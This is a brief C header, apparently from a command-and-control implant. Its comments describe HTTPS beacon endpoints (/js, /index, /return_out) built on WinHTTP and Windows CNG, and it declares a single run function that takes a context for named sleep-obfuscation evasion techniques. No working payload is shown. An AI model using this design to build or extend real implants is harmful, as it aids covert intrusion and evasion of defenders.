/* Anvil C2 (HTTPS /js, /index, /return_out) using WinHTTP + Windows CNG (BCrypt). */
#ifndef TEMPEST_C2_H
#define TEMPEST_C2_H

/* sleep_ctx: PE = Morpheus (BM-T6001); PIC = Deferral Mosaic (BM-T6003). */
void tempest_c2_run(void *sleep_ctx);

#endif
